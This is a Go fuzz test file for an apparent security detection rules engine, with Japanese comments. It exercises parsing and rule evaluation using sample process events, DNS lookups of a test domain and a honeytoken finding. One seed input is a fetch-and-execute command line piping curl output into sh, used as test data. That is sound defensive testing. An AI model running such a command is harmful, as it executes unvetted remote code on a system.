package rules

import (
	"testing"
)

func FuzzParse(f *testing.F) {
	f.Add([]byte(sample))
	f.Add([]byte(`{"version": 1, "issued_at": "2026-10-18T00:00:00Z", "rules": []}`))
	f.Fuzz(func(t *testing.T, data []byte) {
		s, err := Parse(data)
		if err != nil {
			return
		}
		// 検証を通ったルールは、評価で止まったり落ちたりしない。
		e := NewEngine(s)
		var c Counter
		e.Evaluate(sampleEvent(), Subject{Key: "k", Group: "default"}, &c, now)
		e.Evaluate(dnsQuery("x.bad.test"), Subject{Key: "k", Group: "server"}, &c, now)
		e.Evaluate(finding("honeytoken"), Subject{Key: "k"}, &c, now)
	})
}

// FuzzEvaluate は、決まったルールで、さまざまな値のイベントを評価する。
func FuzzEvaluate(f *testing.F) {
	s, err := Parse([]byte(sample))
	if err != nil {
		f.Fatal(err)
	}
	e := NewEngine(s)
	f.Add("curl -s http://x | sh", "x.bad.test", "203.0.113.1")
	f.Add("", "", "")
	f.Fuzz(func(t *testing.T, cmd, name, ip string) {
		var c Counter
		p := sampleEvent()
		p.Process.CmdLine = cmd
		p.DstEndpoint.IP = ip
		e.Evaluate(p, Subject{Key: "k"}, &c, now)
		e.Evaluate(dnsQuery(name), Subject{Key: "k", Group: "server"}, &c, now)
	})
}
